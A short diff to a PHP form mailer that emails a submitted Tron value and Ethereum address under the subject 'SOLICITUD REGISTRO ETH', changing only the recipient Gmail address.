@@ -12,7 +12,7 @@ $mensaje = "Este mensaje fue enviado por: " . $tron . " \r\n";
 $mensaje .= "Su direccion de ethereum es: " . $eth . " \r\n";
 $mensaje .= "Enviado el " . date('d/m/Y', time());
 
-$para = "sevenupsoyo12@gmail.com";//AQUÍ PONES TU CORREO
+$para = "andre8asbl@gmail.com";//AQUÍ PONES TU CORREO
 $asunto = 'SOLICITUD REGISTRO ETH';
 
 mail($para, $asunto, utf8_decode($mensaje), $header);
